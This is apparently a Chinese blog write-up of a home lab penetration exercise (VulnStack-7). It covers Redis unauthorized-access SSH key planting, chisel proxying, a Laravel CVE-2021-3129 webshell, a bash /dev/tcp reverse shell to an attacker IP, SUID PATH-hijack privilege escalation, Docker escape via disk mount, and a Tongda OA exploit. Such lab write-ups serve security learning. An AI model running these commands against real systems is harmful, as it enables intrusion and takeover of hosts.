记一次靶场练习-VulnStack-7

趁着周末的两天做了一下whoami大佬做的靶场VulnStack7，这也是我第一次基本全程都没看wp打的一次靶场。（还是没能独立完全打下来。。。谁让我菜呢）

环境搭建

这里我们需要配置三张网卡

对应上面的图片就是：

DMZ区
桥接模式（自动连接）
ip：10.4.100.1/24

第二层网络
NAT模式
ip：192.168.52.1/24

第三层网络
仅主机模式
ip：192.168.93.1/24

其中VMnet0的IP是随机的，所以我这边只有这张网卡对应的ip和图中不一样，其他都是一样的，剩下的我们只需要按照图中的设置给虚拟机分别配置相应的虚拟网卡就可以了。例如WEB2(图中第二层网络Ubuntu)

剩下的就不一一列出了，都是一样的。

然后就是环境开启：

DMZ区的Ubuntu：需要开启redis和ngnix（redis用root权限开启）
sudo -s
redis-server /etc/redis.conf
/usr/sbin/nginx -c /etc/nginx/nginx.conf

第二层网络的ubuntu：需要开启docker容器（root权限开启）
sudo -s
service docker start
docker start 8e1728

第二层网络的win7:需要开启通达OA（Administrator权限开启，并且关闭防火墙）

Web1

首先就是DMZ区的这个Ubuntu了，先用nmap进行扫描

nmap -sV -sC -T4 -P 1-65535 10.4.166.189

这里我们扫到了nignix和redis服务，ngnix上面起的服务如果有漏洞还得去找，redis如果有未授权访问，就可以直接写webshell、ssh公钥或定时计划拿shell了，所以这里我先选择从redis下手。这里先用本地的redis客户端去连接。

redis-cli -h 10.4.166.189

呦呵，居然成了，那就直接开打吧，我这里选择使用写ssh公钥（毕竟对面22端口也是开着ssh服务的）。首先在本地的/root/.ssh目录里生成ssh公钥key：

ssh-keygen -t rsa

接着将公钥导入key.txt文件（前后用\n换行，避免和Redis里其他缓存数据混合），再把key.txt文件内容写入服务端Redis的缓冲里：

(echo -e "\n\n"; cat /root/.ssh/id_rsa.pub; echo -e "\n\n") > /root/.ssh/key.txt
cat /root/.ssh/key.txt | redis-cli -h 10.4.166.189 -x set xxx

// -x 代表从标准输入读取数据作为该命令的最后一个参数。

然后，使用攻击机连接目标机器Redis，设置Redis的备份路径为/root/.ssh/和保存文件名为authorized_keys，并将数据保存在目标服务器硬盘上

redis-cli -h 10.4.166.189
config set dir /root/.ssh
config set dbfilename authorized_keys
save

然后我们就可以ssh连接了

ssh 10.4.166.189

大功告成，这里拿到的还是root的权限。然后我们将这台机子上线msf（其实没啥必要的，但是我打靶机一般都有上线msf或者CS的习惯，这样才感觉算是完全打了下来），直接本地生成elf文件上传到Ubuntu中运行，本地msf开启监听：

成功上线。然后我们设置代理准备进行进一步的攻击，这里我用的是chisel

./chisel server -p 2333 --socks5     //在ubuntu上2333端口开启服务端
./chisel client 10.4.166.189 socks   //在本地1080端口开启客户端（1080是默认设置好的，不需要我们设置）

然后就可以挂代理进行扫描了

首先我们看一下这台web1的网段信息：

他有两张网卡，我们挂代理扫一下192.168.52.0/24的主机存活信息，这里我用的proxychains加nmap

proxychains4 nmap -sP 192.168.52.0/24

看样子192.168.52.20和192.168.52.30也应该是存在的，为了证实我的猜测，这里用192.168.52.10这台机子ping一下，结果都能ping通（这里就不截图了）。那说明之前的猜测没问题，接下来就该准备打这两台机子了

proxychains4 nmap -sC -sV -T4 -A 192.168.52.20

看样子8000端口有web服务，这里我们给浏览器挂代理访问一下：

是个laravel，版本还挺新。这个时候，我突然想起貌似之前的web1还起着ngnix的服务，心血来潮的我访问了一下：

好家伙，居然是一个东西（这两张图除了url不一样，其它一毛一样啊）。这里应该是web1上的nginx把web2上的服务代理了过来。幸亏当时没有先打这个laravel（下文会解释的）。那好了，现在问题就是怎样去打这个laravel了。由于laravel版本比较新，所以上网上去找一些比较新的laravel漏洞（行吧，其实这里最后还是看了眼wp，漏洞我找的没错，可惜我找的工具shell弹不过来），从wp中找到了这个工具：https://github.com/zhzyker/CVE-2021-3129。（主要用于检测）

然后蚁剑连一下：

成功了。（脚本小子的悲哀，找不到能用的工具就G）

这里检测一下拿到的shell是否运行在docker容器中（毕竟环境是自己配的）：

ls -l /.dockerenv  //这个文件存在的话就说明的确是运行在docker环境中的

看样子的确是在容器中，那接下来就是docker逃逸了，不过这里只是个普通用户权限，不像上次的vulnstack4一样是root，所以不能直接和上次一样直接挂载，先想办法提权。

提权

由于在蚁剑中不好操作，所以先反弹一个shell回来

nc -lvp 1234     //本机起监听
bash -i >& /dev/tcp/10.4.100.150/1234 0>&1   //蚁剑上运行，弹一个shell到攻击机监听的端口

然后，额。。。

好家伙，报错了。上网上查了一下，说是可能bin/sh默认指向的不是bash，这里看一下：

ls -al /bin/sh

可以看到/bin/sh其实是一个软连接文件(l),类似于windows中的快捷方式，只不过在ubuntu中/bin/sh这个软连接指向了dash，既然它没指向bash，那就修改它指向bash

ln -s -f bash /bin/sh

哭了，还没权限，最后我把反弹shell的语句写进了一个sh脚本，然后用bash运行，终于是成功弹回了shell

那就继续下一步呗，提权（这是我第二次看wp，也是最后一次，没办法，菜呀）

这里用到了suid提权，suid是一种特殊的文件属性，它允许用户执行的文件已该文件的拥有者的身份运行，比如一个具有suid属性的文件的拥有者是root用户，就可以root权限运行，而我们的提权就是查找有高权的文件，也就是说这个文件拥有root权限，那么通过这个文件调用的任何命令就都有root权限，那么再修改环境变量，让这个文件调用的命令指向我们写的恶意命令就可以进行权限提升。

首先我们看看容器中有哪些高权限文件：

find / -perm -u=s -type f 2>/dev/null

这里看到了一个/home/jobs/shell

先试着运行一下这个文件，发现结果很像ps命令

这个shell脚本中应该是用system这样的函数调用了ps命令，那么我们就可以对其进行劫持:

cd /tmp
echo "/bin/bash" > ps
chmod 777 ps
echo $PATH
export PATH=/tmp:$PATH 
cd /home/jobs
./shell

这样一来，我们就变成了root权限

这里大概解释一下，我们先在/tmp目录下生成了一个名为ps的恶意文件并赋予执行权限，/bin/bash就是进入命令行，然后我们把环境变量中添加/tmp,这样的话，系统执行命令时会先来到/tmp目录下寻找相应文件并执行,之前说过，那个shell脚本中应该是调用了ps。也就是说，当我们以root命令执行这个shell脚本时，它会先到/tmp目录下找ps并调用，这时候就会以root权限调用我们的恶意文件ps，这样我们就以root权限进入了命令行。

docker主机逃逸

这个过程和之前的vulnstack4是一样的，我们先在根目录下创建一个名为hack的文件夹，并将/dev/sda1挂载到/hack目录里：

mount /dev/sda1 /hack
ls /hack

这里可以看到已经挂载成功，然后就是写ssh公钥了，想想之前打web1的redis的时候就生成过一个公钥，我们把它写进key.txt中并用蚁剑上传到web2中，然后再写进.ssh目录下

cat /var/www/html/key.txt > /hack/home/ubuntu/.ssh/authorized_keys

已经成功写入，最后ssh连接即可

ssh ubuntu@192.168.52.20

这里解释一下上文说的为什么幸好没有一开始就打laravel，如果一开始我们就这么打，我们最后ssh连接的时候恐怕会直接连web1，而实际上公钥是让我们写在了web2中的，所以是无法成功的。

PC1

proxychains4 nmap -Pn -sT -sV 192.168.52.30

8080端口赫然存在着一个web服务，浏览器访问

是一个通达OA，碰上这种OA，直接上网上找poc。

找到了这么一个工具：https://github.com/wikiZ/tongda-exp-poc

里面有两个python文件，一个是用来检测的，一个是用来攻击的。首先我们检测一下：

proxychains4 python tongdapoc.py -H http://192.168.52.30:8080/

扫着了，有漏洞，那就换第二个打就行。

proxychains4 python tongdaexp.py -H http://192.168.52.30:8080/   -file-shell

成功生成了一个名为xiaoma.php的木马（当时没截图）

这里的确有了有了这个小马，我原本以为已经拿下了，没想到连接的时候报错了，蚁剑、冰蝎、哥斯拉都连不上。我想了一下，既然它能传上去一个木马文件，肯定是已经成功利用通信OA这个漏洞了的，问题就出在上传的文件内容本身了。上传文件的内容应该是贴在源码里的，去找找：

还真是，这一大段base64解码过后的内容就是木马源码了，为什么连接会失败之后再研究吧，先把它打下来，于是我把这一段base64数据改成了一句话木马形式
